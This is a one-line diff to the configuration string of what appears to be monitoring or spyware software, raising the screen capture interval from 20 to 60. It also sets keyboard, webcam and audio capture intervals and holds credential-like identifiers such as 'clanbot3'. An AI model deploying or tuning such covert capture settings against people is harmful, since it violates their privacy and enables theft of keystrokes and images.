@@ -1,1 +1,1 @@
-keyboard_capture_interval=300;webcam_capture_interval=2400;screen_capture_interval=20;configurations_update_interval=60;stored_images_quantity=2;start_webcam_capture=0;mp=plop;mu=clanbot3;mt=clanbot3;rms_level=0.4;audio_capture_interval=180;print_rms_level=1;
+keyboard_capture_interval=300;webcam_capture_interval=2400;screen_capture_interval=60;configurations_update_interval=60;stored_images_quantity=2;start_webcam_capture=0;mp=plop;mu=clanbot3;mt=clanbot3;rms_level=0.4;audio_capture_interval=180;print_rms_level=1;
